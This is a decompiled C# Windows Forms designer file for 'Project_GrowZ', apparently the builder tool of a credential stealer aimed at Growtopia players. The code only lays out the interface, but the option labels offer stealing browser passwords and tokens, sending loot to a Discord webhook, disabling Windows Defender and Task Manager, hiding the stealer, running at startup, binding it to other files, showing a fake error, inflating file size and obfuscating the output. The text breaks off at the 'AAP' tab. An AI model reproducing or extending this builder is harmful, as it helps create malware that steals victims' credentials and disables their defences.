namespace Project_GrowZ
{
	// Token: 0x02000003 RID: 3
	public partial class Builder : global::MetroFramework.Forms.MetroForm
	{
		// Token: 0x06000027 RID: 39 RVA: 0x00002232 File Offset: 0x00000432
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x06000028 RID: 40 RVA: 0x00003C28 File Offset: 0x00001E28
		private void InitializeComponent()
		{
            this.components = new System.ComponentModel.Container();
            this.metroStyleManager1 = new MetroFramework.Components.MetroStyleManager(this.components);
            this.metroTabControl1 = new MetroFramework.Controls.MetroTabControl();
            this.Builders = new MetroFramework.Controls.MetroTabPage();
            this.groupBox6 = new System.Windows.Forms.GroupBox();
            this.enabledc = new MetroFramework.Controls.MetroCheckBox();
            this.txtwebhook = new MetroFramework.Controls.MetroTextBox();
            this.groupBox5 = new System.Windows.Forms.GroupBox();
            this.label3214c1c = new System.Windows.Forms.Label();
            this.pumpFiletxt = new MetroFramework.Controls.MetroTextBox();
            this.pumpFile = new MetroFramework.Controls.MetroCheckBox();
            this.groupBox4 = new System.Windows.Forms.GroupBox();
            this.label2 = new System.Windows.Forms.Label();
            this.testFakeMessage = new MetroFramework.Controls.MetroButton();
            this.fakemessage = new MetroFramework.Controls.MetroCheckBox();
            this.fakemessagetxt = new MetroFramework.Controls.MetroTextBox();
            this.groupBox3 = new System.Windows.Forms.GroupBox();
            this.label1 = new System.Windows.Forms.Label();
            this.bindedfiles = new System.Windows.Forms.ListView();
            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader3 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.metroButton1 = new MetroFramework.Controls.MetroButton();
            this.metroComboBox1 = new MetroFramework.Controls.MetroComboBox();
            this.bindadd = new MetroFramework.Controls.MetroButton();
            this.bindremove = new MetroFramework.Controls.MetroButton();
            this.compilebtn = new MetroFramework.Controls.MetroButton();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.passwords = new MetroFramework.Controls.MetroCheckBox();
            this.diswin = new MetroFramework.Controls.MetroCheckBox();
            this.encryptst = new MetroFramework.Controls.MetroCheckBox();
            this.Obfuscate = new MetroFramework.Controls.MetroCheckBox();
            this.screenshot = new MetroFramework.Controls.MetroCheckBox();
            this.cetrainerExtension = new MetroFramework.Controls.MetroCheckBox();
            this.disableManager = new MetroFramework.Controls.MetroCheckBox();
            this.corruptgt = new MetroFramework.Controls.MetroCheckBox();
            this.tokensteal = new MetroFramework.Controls.MetroCheckBox();
            this.tracecheck = new MetroFramework.Controls.MetroCheckBox();
            this.hidecheck = new MetroFramework.Controls.MetroCheckBox();
            this.checkstart = new MetroFramework.Controls.MetroCheckBox();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.label2123 = new System.Windows.Forms.Label();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.iconcheck = new MetroFramework.Controls.MetroCheckBox();
            this.iconbutton = new MetroFramework.Controls.MetroButton();
            this.icontxt = new MetroFramework.Controls.MetroTextBox();
            this.AAP = new MetroFramework.Controls.MetroTabPage();
            this.groupBox7 = new System.Windows.Forms.GroupBox();
            this.stopproxy = new MetroFramework.Controls.MetroButton();
            this.startproxy = new MetroFramework.Controls.MetroButton();
            this.label6 = new System.Windows.Forms.Label();
            this.groupBox10 = new System.Windows.Forms.GroupBox();
            this.metroButton6 = new MetroFramework.Controls.MetroButton();
            this.metroTextBox1 = new MetroFramework.Controls.MetroTextBox();
            this.label4 = new System.Windows.Forms.Label();
            this.groupBox9 = new System.Windows.Forms.GroupBox();
            this.label5 = new System.Windows.Forms.Label();
            this.metroButton5 = new MetroFramework.Controls.MetroButton();
            this.metroButton4 = new MetroFramework.Controls.MetroButton();
            this.metroButton2 = new MetroFramework.Controls.MetroButton();
            this.label3 = new System.Windows.Forms.Label();
            this.manualmactxt = new MetroFramework.Controls.MetroTextBox();
            this.pictureBox2 = new System.Windows.Forms.PictureBox();
            this.label13123 = new System.Windows.Forms.Label();
            ((System.ComponentModel.ISupportInitialize)(this.metroStyleManager1)).BeginInit();
            this.metroTabControl1.SuspendLayout();
            this.Builders.SuspendLayout();
            this.groupBox6.SuspendLayout();
            this.groupBox5.SuspendLayout();
            this.groupBox4.SuspendLayout();
            this.groupBox3.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.groupBox1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.AAP.SuspendLayout();
            this.groupBox7.SuspendLayout();
            this.groupBox10.SuspendLayout();
            this.groupBox9.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
            this.SuspendLayout();
            // 
            // metroStyleManager1
            // 
            this.metroStyleManager1.Owner = this;
            this.metroStyleManager1.Style = MetroFramework.MetroColorStyle.Red;
            this.metroStyleManager1.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // metroTabControl1
            // 
            this.metroTabControl1.Controls.Add(this.Builders);
            this.metroTabControl1.Controls.Add(this.AAP);
            this.metroTabControl1.Location = new System.Drawing.Point(23, 58);
            this.metroTabControl1.Name = "metroTabControl1";
            this.metroTabControl1.Padding = new System.Drawing.Point(6, 8);
            this.metroTabControl1.SelectedIndex = 0;
            this.metroTabControl1.Size = new System.Drawing.Size(735, 450);
            this.metroTabControl1.Style = MetroFramework.MetroColorStyle.Red;
            this.metroTabControl1.TabIndex = 2;
            this.metroTabControl1.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // Builders
            // 
            this.Builders.Controls.Add(this.groupBox6);
            this.Builders.Controls.Add(this.groupBox5);
            this.Builders.Controls.Add(this.groupBox4);
            this.Builders.Controls.Add(this.groupBox3);
            this.Builders.Controls.Add(this.compilebtn);
            this.Builders.Controls.Add(this.groupBox2);
            this.Builders.Controls.Add(this.groupBox1);
            this.Builders.Enabled = true;
            this.Builders.HorizontalScrollbarBarColor = true;
            this.Builders.Location = new System.Drawing.Point(4, 35);
            this.Builders.Name = "Builders";
            this.Builders.Size = new System.Drawing.Size(727, 411);
            this.Builders.TabIndex = 0;
            this.Builders.Text = "Builder";
            this.Builders.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.Builders.VerticalScrollbarBarColor = true;
            this.Builders.Visible = true;
            // 
            // groupBox6
            // 
            this.groupBox6.BackColor = System.Drawing.Color.Transparent;
            this.groupBox6.Controls.Add(this.enabledc);
            this.groupBox6.Controls.Add(this.txtwebhook);
            this.groupBox6.Font = new System.Drawing.Font("Arial", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.groupBox6.ForeColor = System.Drawing.Color.DarkRed;
            this.groupBox6.Location = new System.Drawing.Point(0, 5);
            this.groupBox6.Name = "groupBox6";
            this.groupBox6.Size = new System.Drawing.Size(353, 69);
            this.groupBox6.TabIndex = 41;
            this.groupBox6.TabStop = false;
            this.groupBox6.Text = "Discord info";
            // 
            // enabledc
            // 
            this.enabledc.AutoSize = true;
            this.enabledc.Location = new System.Drawing.Point(5, 22);
            this.enabledc.Margin = new System.Windows.Forms.Padding(2);
            this.enabledc.Name = "enabledc";
            this.enabledc.Size = new System.Drawing.Size(139, 15);
            this.enabledc.Style = MetroFramework.MetroColorStyle.Red;
            this.enabledc.TabIndex = 40;
            this.enabledc.Text = "Use Discord Webhook";
            this.enabledc.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.enabledc.CheckedChanged += new System.EventHandler(this.enabledc_CheckedChanged);
            // 
            // txtwebhook
            // 
            this.txtwebhook.Enabled = false;
            this.txtwebhook.Location = new System.Drawing.Point(3, 42);
            this.txtwebhook.Name = "txtwebhook";
            this.txtwebhook.PromptText = "Paste your webhook url here...";
            this.txtwebhook.Size = new System.Drawing.Size(348, 23);
            this.txtwebhook.Style = MetroFramework.MetroColorStyle.Red;
            this.txtwebhook.TabIndex = 37;
            this.txtwebhook.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // groupBox5
            // 
            this.groupBox5.BackColor = System.Drawing.Color.Transparent;
            this.groupBox5.Controls.Add(this.label3214c1c);
            this.groupBox5.Controls.Add(this.pumpFiletxt);
            this.groupBox5.Controls.Add(this.pumpFile);
            this.groupBox5.Font = new System.Drawing.Font("Arial", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.groupBox5.ForeColor = System.Drawing.Color.DarkRed;
            this.groupBox5.Location = new System.Drawing.Point(186, 218);
            this.groupBox5.Name = "groupBox5";
            this.groupBox5.Size = new System.Drawing.Size(167, 87);
            this.groupBox5.TabIndex = 39;
            this.groupBox5.TabStop = false;
            this.groupBox5.Text = "File Pumper";
            // 
            // label3214c1c
            // 
            this.label3214c1c.AutoSize = true;
            this.label3214c1c.BackColor = System.Drawing.Color.Transparent;
            this.label3214c1c.Font = new System.Drawing.Font("Arial", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3214c1c.ForeColor = System.Drawing.Color.DarkRed;
            this.label3214c1c.Location = new System.Drawing.Point(5, 64);
            this.label3214c1c.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label3214c1c.Name = "label3214c1c";
            this.label3214c1c.Size = new System.Drawing.Size(82, 14);
            this.label3214c1c.TabIndex = 40;
            this.label3214c1c.Text = "Amount (MB):";
            // 
            // pumpFiletxt
            // 
            this.pumpFiletxt.Enabled = false;
            this.pumpFiletxt.Location = new System.Drawing.Point(93, 60);
            this.pumpFiletxt.MaxLength = 3;
            this.pumpFiletxt.Name = "pumpFiletxt";
            this.pumpFiletxt.Size = new System.Drawing.Size(72, 23);
            this.pumpFiletxt.Style = MetroFramework.MetroColorStyle.Red;
            this.pumpFiletxt.TabIndex = 40;
            this.pumpFiletxt.Text = "1";
            this.pumpFiletxt.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // pumpFile
            // 
            this.pumpFile.AutoSize = true;
            this.pumpFile.Location = new System.Drawing.Point(5, 20);
            this.pumpFile.Margin = new System.Windows.Forms.Padding(2);
            this.pumpFile.Name = "pumpFile";
            this.pumpFile.Size = new System.Drawing.Size(108, 15);
            this.pumpFile.Style = MetroFramework.MetroColorStyle.Red;
            this.pumpFile.TabIndex = 39;
            this.pumpFile.Text = "Use File Pumper";
            this.pumpFile.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.pumpFile.CheckedChanged += new System.EventHandler(this.pumpFile_CheckedChanged);
            // 
            // groupBox4
            // 
            this.groupBox4.BackColor = System.Drawing.Color.Transparent;
            this.groupBox4.Controls.Add(this.label2);
            this.groupBox4.Controls.Add(this.testFakeMessage);
            this.groupBox4.Controls.Add(this.fakemessage);
            this.groupBox4.Controls.Add(this.fakemessagetxt);
            this.groupBox4.Font = new System.Drawing.Font("Arial", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.groupBox4.ForeColor = System.Drawing.Color.DarkRed;
            this.groupBox4.Location = new System.Drawing.Point(0, 218);
            this.groupBox4.Name = "groupBox4";
            this.groupBox4.Size = new System.Drawing.Size(180, 87);
            this.groupBox4.TabIndex = 38;
            this.groupBox4.TabStop = false;
            this.groupBox4.Text = "Fake Error";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.BackColor = System.Drawing.Color.Transparent;
            this.label2.Font = new System.Drawing.Font("Arial", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.ForeColor = System.Drawing.Color.DarkRed;
            this.label2.Location = new System.Drawing.Point(5, 41);
            this.label2.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(61, 14);
            this.label2.TabIndex = 41;
            this.label2.Text = "Message:";
            // 
            // testFakeMessage
            // 
            this.testFakeMessage.Enabled = false;
            this.testFakeMessage.Location = new System.Drawing.Point(103, 12);
            this.testFakeMessage.Margin = new System.Windows.Forms.Padding(2);
            this.testFakeMessage.Name = "testFakeMessage";
            this.testFakeMessage.Size = new System.Drawing.Size(72, 21);
            this.testFakeMessage.Style = MetroFramework.MetroColorStyle.Red;
            this.testFakeMessage.TabIndex = 40;
            this.testFakeMessage.Text = "Test";
            this.testFakeMessage.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.testFakeMessage.Click += new System.EventHandler(this.testFakeMessage_Click);
            // 
            // fakemessage
            // 
            this.fakemessage.AutoSize = true;
            this.fakemessage.Location = new System.Drawing.Point(5, 20);
            this.fakemessage.Margin = new System.Windows.Forms.Padding(2);
            this.fakemessage.Name = "fakemessage";
            this.fakemessage.Size = new System.Drawing.Size(75, 15);
            this.fakemessage.Style = MetroFramework.MetroColorStyle.Red;
            this.fakemessage.TabIndex = 22;
            this.fakemessage.Text = "Fake Error";
            this.fakemessage.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.fakemessage.CheckedChanged += new System.EventHandler(this.fakemessage_CheckedChanged);
            // 
            // fakemessagetxt
            // 
            this.fakemessagetxt.Enabled = false;
            this.fakemessagetxt.Location = new System.Drawing.Point(4, 60);
            this.fakemessagetxt.Name = "fakemessagetxt";
            this.fakemessagetxt.PromptText = "Type message here...";
            this.fakemessagetxt.Size = new System.Drawing.Size(170, 23);
            this.fakemessagetxt.Style = MetroFramework.MetroColorStyle.Red;
            this.fakemessagetxt.TabIndex = 38;
            this.fakemessagetxt.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // groupBox3
            // 
            this.groupBox3.BackColor = System.Drawing.Color.Transparent;
            this.groupBox3.Controls.Add(this.label1);
            this.groupBox3.Controls.Add(this.bindedfiles);
            this.groupBox3.Controls.Add(this.metroButton1);
            this.groupBox3.Controls.Add(this.metroComboBox1);
            this.groupBox3.Controls.Add(this.bindadd);
            this.groupBox3.Controls.Add(this.bindremove);
            this.groupBox3.Font = new System.Drawing.Font("Arial", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.groupBox3.ForeColor = System.Drawing.Color.DarkRed;
            this.groupBox3.Location = new System.Drawing.Point(379, 5);
            this.groupBox3.Name = "groupBox3";
            this.groupBox3.Size = new System.Drawing.Size(347, 296);
            this.groupBox3.TabIndex = 34;
            this.groupBox3.TabStop = false;
            this.groupBox3.Text = "File Binder";
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.BackColor = System.Drawing.Color.Transparent;
            this.label1.Font = new System.Drawing.Font("Arial", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.ForeColor = System.Drawing.Color.DarkRed;
            this.label1.Location = new System.Drawing.Point(3, 215);
            this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(97, 14);
            this.label1.TabIndex = 41;
            this.label1.Text = "Binded File Path:";
            // 
            // bindedfiles
            // 
            this.bindedfiles.BackColor = System.Drawing.Color.Black;
            this.bindedfiles.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader1,
            this.columnHeader3});
            this.bindedfiles.ForeColor = System.Drawing.SystemColors.Window;
            this.bindedfiles.HideSelection = false;
            this.bindedfiles.Location = new System.Drawing.Point(4, 21);
            this.bindedfiles.Name = "bindedfiles";
            this.bindedfiles.Size = new System.Drawing.Size(337, 187);
            this.bindedfiles.TabIndex = 42;
            this.bindedfiles.UseCompatibleStateImageBehavior = false;
            this.bindedfiles.View = System.Windows.Forms.View.Details;
            // 
            // columnHeader1
            // 
            this.columnHeader1.Text = "File";
            this.columnHeader1.Width = 214;
            // 
            // columnHeader3
            // 
            this.columnHeader3.Text = "Run as admin";
            this.columnHeader3.Width = 119;
            // 
            // metroButton1
            // 
            this.metroButton1.Location = new System.Drawing.Point(253, 267);
            this.metroButton1.Margin = new System.Windows.Forms.Padding(2);
            this.metroButton1.Name = "metroButton1";
            this.metroButton1.Size = new System.Drawing.Size(88, 24);
            this.metroButton1.Style = MetroFramework.MetroColorStyle.Red;
            this.metroButton1.TabIndex = 41;
            this.metroButton1.Text = "Toggle";
            this.metroButton1.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroButton1.Click += new System.EventHandler(this.metroButton1_Click);
            // 
            // metroComboBox1
            // 
            this.metroComboBox1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.metroComboBox1.FormattingEnabled = true;
            this.metroComboBox1.ItemHeight = 23;
            this.metroComboBox1.Items.AddRange(new object[] {
            "%TEMP%",
            "%LOCALAPPDATA%",
            "%APPDATA%"});
            this.metroComboBox1.Location = new System.Drawing.Point(4, 235);
            this.metroComboBox1.Name = "metroComboBox1";
            this.metroComboBox1.Size = new System.Drawing.Size(130, 29);
            this.metroComboBox1.Style = MetroFramework.MetroColorStyle.Red;
            this.metroComboBox1.TabIndex = 40;
            this.metroComboBox1.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // bindadd
            // 
            this.bindadd.Location = new System.Drawing.Point(4, 267);
            this.bindadd.Margin = new System.Windows.Forms.Padding(2);
            this.bindadd.Name = "bindadd";
            this.bindadd.Size = new System.Drawing.Size(130, 24);
            this.bindadd.Style = MetroFramework.MetroColorStyle.Red;
            this.bindadd.TabIndex = 38;
            this.bindadd.Text = "Add";
            this.bindadd.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.bindadd.Click += new System.EventHandler(this.bindadd_Click);
            // 
            // bindremove
            // 
            this.bindremove.Location = new System.Drawing.Point(135, 267);
            this.bindremove.Margin = new System.Windows.Forms.Padding(2);
            this.bindremove.Name = "bindremove";
            this.bindremove.Size = new System.Drawing.Size(117, 24);
            this.bindremove.Style = MetroFramework.MetroColorStyle.Red;
            this.bindremove.TabIndex = 39;
            this.bindremove.Text = "Remove";
            this.bindremove.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.bindremove.Click += new System.EventHandler(this.bindremove_Click);
            // 
            // compilebtn
            // 
            this.compilebtn.Location = new System.Drawing.Point(379, 317);
            this.compilebtn.Margin = new System.Windows.Forms.Padding(2);
            this.compilebtn.Name = "compilebtn";
            this.compilebtn.Size = new System.Drawing.Size(348, 91);
            this.compilebtn.Style = MetroFramework.MetroColorStyle.Red;
            this.compilebtn.TabIndex = 36;
            this.compilebtn.Text = "Build!";
            this.compilebtn.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.compilebtn.Click += new System.EventHandler(this.compilebtn_Click);
            // 
            // groupBox2
            // 
            this.groupBox2.BackColor = System.Drawing.Color.Transparent;
            this.groupBox2.Controls.Add(this.passwords);
            this.groupBox2.Controls.Add(this.diswin);
            this.groupBox2.Controls.Add(this.encryptst);
            this.groupBox2.Controls.Add(this.Obfuscate);
            this.groupBox2.Controls.Add(this.screenshot);
            this.groupBox2.Controls.Add(this.cetrainerExtension);
            this.groupBox2.Controls.Add(this.disableManager);
            this.groupBox2.Controls.Add(this.corruptgt);
            this.groupBox2.Controls.Add(this.tokensteal);
            this.groupBox2.Controls.Add(this.tracecheck);
            this.groupBox2.Controls.Add(this.hidecheck);
            this.groupBox2.Controls.Add(this.checkstart);
            this.groupBox2.Font = new System.Drawing.Font("Arial", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.groupBox2.ForeColor = System.Drawing.Color.DarkRed;
            this.groupBox2.Location = new System.Drawing.Point(0, 77);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(353, 136);
            this.groupBox2.TabIndex = 33;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Options";
            // 
            // passwords
            // 
            this.passwords.AutoSize = true;
            this.passwords.Location = new System.Drawing.Point(177, 77);
            this.passwords.Margin = new System.Windows.Forms.Padding(2);
            this.passwords.Name = "passwords";
            this.passwords.Size = new System.Drawing.Size(151, 15);
            this.passwords.Style = MetroFramework.MetroColorStyle.Red;
            this.passwords.TabIndex = 28;
            this.passwords.Text = "Steal Browser Passwords";
            this.passwords.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // diswin
            // 
            this.diswin.AutoSize = true;
            this.diswin.Location = new System.Drawing.Point(177, 115);
            this.diswin.Margin = new System.Windows.Forms.Padding(2);
            this.diswin.Name = "diswin";
            this.diswin.Size = new System.Drawing.Size(164, 15);
            this.diswin.Style = MetroFramework.MetroColorStyle.Red;
            this.diswin.TabIndex = 27;
            this.diswin.Text = "Disable Windows Defender";
            this.diswin.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // encryptst
            // 
            this.encryptst.AutoCheck = false;
            this.encryptst.AutoSize = true;
            this.encryptst.Checked = true;
            this.encryptst.CheckState = System.Windows.Forms.CheckState.Checked;
            this.encryptst.Location = new System.Drawing.Point(177, 20);
            this.encryptst.Margin = new System.Windows.Forms.Padding(2);
            this.encryptst.Name = "encryptst";
            this.encryptst.Size = new System.Drawing.Size(102, 15);
            this.encryptst.Style = MetroFramework.MetroColorStyle.Red;
            this.encryptst.TabIndex = 25;
            this.encryptst.Text = "Encrypt Strings";
            this.encryptst.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // Obfuscate
            // 
            this.Obfuscate.AutoCheck = false;
            this.Obfuscate.AutoSize = true;
            this.Obfuscate.Checked = true;
            this.Obfuscate.CheckState = System.Windows.Forms.CheckState.Checked;
            this.Obfuscate.Location = new System.Drawing.Point(5, 20);
            this.Obfuscate.Margin = new System.Windows.Forms.Padding(2);
            this.Obfuscate.Name = "Obfuscate";
            this.Obfuscate.Size = new System.Drawing.Size(77, 15);
            this.Obfuscate.Style = MetroFramework.MetroColorStyle.Red;
            this.Obfuscate.TabIndex = 26;
            this.Obfuscate.Text = "Obfuscate";
            this.Obfuscate.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // screenshot
            // 
            this.screenshot.AutoSize = true;
            this.screenshot.Location = new System.Drawing.Point(177, 58);
            this.screenshot.Margin = new System.Windows.Forms.Padding(2);
            this.screenshot.Name = "screenshot";
            this.screenshot.Size = new System.Drawing.Size(107, 15);
            this.screenshot.Style = MetroFramework.MetroColorStyle.Red;
            this.screenshot.TabIndex = 24;
            this.screenshot.Text = "Take Screenshot";
            this.screenshot.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // cetrainerExtension
            // 
            this.cetrainerExtension.AutoSize = true;
            this.cetrainerExtension.Location = new System.Drawing.Point(5, 115);
            this.cetrainerExtension.Margin = new System.Windows.Forms.Padding(2);
            this.cetrainerExtension.Name = "cetrainerExtension";
            this.cetrainerExtension.Size = new System.Drawing.Size(140, 15);
            this.cetrainerExtension.Style = MetroFramework.MetroColorStyle.Red;
            this.cetrainerExtension.TabIndex = 18;
            this.cetrainerExtension.Text = ".CETRAINER Extension";
            this.cetrainerExtension.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // disableManager
            // 
            this.disableManager.AutoSize = true;
            this.disableManager.Location = new System.Drawing.Point(177, 96);
            this.disableManager.Margin = new System.Windows.Forms.Padding(2);
            this.disableManager.Name = "disableManager";
            this.disableManager.Size = new System.Drawing.Size(136, 15);
            this.disableManager.Style = MetroFramework.MetroColorStyle.Red;
            this.disableManager.TabIndex = 21;
            this.disableManager.Text = "Disable Task Manager";
            this.disableManager.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // corruptgt
            // 
            this.corruptgt.AutoSize = true;
            this.corruptgt.Location = new System.Drawing.Point(5, 96);
            this.corruptgt.Margin = new System.Windows.Forms.Padding(2);
            this.corruptgt.Name = "corruptgt";
            this.corruptgt.Size = new System.Drawing.Size(81, 15);
            this.corruptgt.Style = MetroFramework.MetroColorStyle.Red;
            this.corruptgt.TabIndex = 12;
            this.corruptgt.Text = "Corrupt GT";
            this.corruptgt.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // tokensteal
            // 
            this.tokensteal.AutoSize = true;
            this.tokensteal.Location = new System.Drawing.Point(177, 39);
            this.tokensteal.Margin = new System.Windows.Forms.Padding(2);
            this.tokensteal.Name = "tokensteal";
            this.tokensteal.Size = new System.Drawing.Size(87, 15);
            this.tokensteal.Style = MetroFramework.MetroColorStyle.Red;
            this.tokensteal.TabIndex = 11;
            this.tokensteal.Text = "Steal Tokens";
            this.tokensteal.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // tracecheck
            // 
            this.tracecheck.AutoSize = true;
            this.tracecheck.Location = new System.Drawing.Point(5, 58);
            this.tracecheck.Margin = new System.Windows.Forms.Padding(2);
            this.tracecheck.Name = "tracecheck";
            this.tracecheck.Size = new System.Drawing.Size(98, 15);
            this.tracecheck.Style = MetroFramework.MetroColorStyle.Red;
            this.tracecheck.TabIndex = 9;
            this.tracecheck.Text = "Trace Save Dat";
            this.tracecheck.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // hidecheck
            // 
            this.hidecheck.AutoSize = true;
            this.hidecheck.Location = new System.Drawing.Point(5, 77);
            this.hidecheck.Margin = new System.Windows.Forms.Padding(2);
            this.hidecheck.Name = "hidecheck";
            this.hidecheck.Size = new System.Drawing.Size(86, 15);
            this.hidecheck.Style = MetroFramework.MetroColorStyle.Red;
            this.hidecheck.TabIndex = 10;
            this.hidecheck.Text = "Hide Stealer";
            this.hidecheck.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // checkstart
            // 
            this.checkstart.AutoSize = true;
            this.checkstart.Location = new System.Drawing.Point(5, 39);
            this.checkstart.Margin = new System.Windows.Forms.Padding(2);
            this.checkstart.Name = "checkstart";
            this.checkstart.Size = new System.Drawing.Size(117, 15);
            this.checkstart.Style = MetroFramework.MetroColorStyle.Red;
            this.checkstart.TabIndex = 8;
            this.checkstart.Text = "Turn on at startup";
            this.checkstart.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // groupBox1
            // 
            this.groupBox1.BackColor = System.Drawing.Color.Transparent;
            this.groupBox1.Controls.Add(this.label2123);
            this.groupBox1.Controls.Add(this.pictureBox1);
            this.groupBox1.Controls.Add(this.iconcheck);
            this.groupBox1.Controls.Add(this.iconbutton);
            this.groupBox1.Controls.Add(this.icontxt);
            this.groupBox1.Font = new System.Drawing.Font("Arial", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.groupBox1.ForeColor = System.Drawing.Color.DarkRed;
            this.groupBox1.Location = new System.Drawing.Point(0, 313);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(353, 95);
            this.groupBox1.TabIndex = 32;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Stealer Icon (*.ico)";
            // 
            // label2123
            // 
            this.label2123.AutoSize = true;
            this.label2123.BackColor = System.Drawing.Color.Transparent;
            this.label2123.Font = new System.Drawing.Font("Arial", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2123.ForeColor = System.Drawing.Color.DarkRed;
            this.label2123.Location = new System.Drawing.Point(163, 14);
            this.label2123.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label2123.Name = "label2123";
            this.label2123.Size = new System.Drawing.Size(94, 16);
            this.label2123.TabIndex = 37;
            this.label2123.Text = "Icon preview:";
            // 
            // pictureBox1
            // 
            this.pictureBox1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(12)))), ((int)(((byte)(12)))), ((int)(((byte)(12)))));
            this.pictureBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.pictureBox1.Location = new System.Drawing.Point(290, 10);
            this.pictureBox1.Margin = new System.Windows.Forms.Padding(2);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(61, 53);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox1.TabIndex = 7;
            this.pictureBox1.TabStop = false;
            // 
            // iconcheck
            // 
            this.iconcheck.AutoSize = true;
            this.iconcheck.Location = new System.Drawing.Point(6, 22);
            this.iconcheck.Margin = new System.Windows.Forms.Padding(2);
            this.iconcheck.Name = "iconcheck";
            this.iconcheck.Size = new System.Drawing.Size(46, 15);
            this.iconcheck.Style = MetroFramework.MetroColorStyle.Red;
            this.iconcheck.TabIndex = 2;
            this.iconcheck.Text = "Icon";
            this.iconcheck.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.iconcheck.CheckedChanged += new System.EventHandler(this.iconcheck_CheckedChanged);
            // 
            // iconbutton
            // 
            this.iconbutton.Enabled = false;
            this.iconbutton.Location = new System.Drawing.Point(323, 67);
            this.iconbutton.Margin = new System.Windows.Forms.Padding(2);
            this.iconbutton.Name = "iconbutton";
            this.iconbutton.Size = new System.Drawing.Size(27, 23);
            this.iconbutton.Style = MetroFramework.MetroColorStyle.Red;
            this.iconbutton.TabIndex = 4;
            this.iconbutton.Text = "...";
            this.iconbutton.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.iconbutton.Click += new System.EventHandler(this.iconbutton_Click);
            // 
            // icontxt
            // 
            this.icontxt.Enabled = false;
            this.icontxt.Location = new System.Drawing.Point(4, 67);
            this.icontxt.Margin = new System.Windows.Forms.Padding(2);
            this.icontxt.Multiline = true;
            this.icontxt.Name = "icontxt";
            this.icontxt.Size = new System.Drawing.Size(318, 23);
            this.icontxt.Style = MetroFramework.MetroColorStyle.Red;
            this.icontxt.TabIndex = 3;
            this.icontxt.Theme = MetroFramework.MetroThemeStyle.Dark;
            // 
            // AAP
            // 
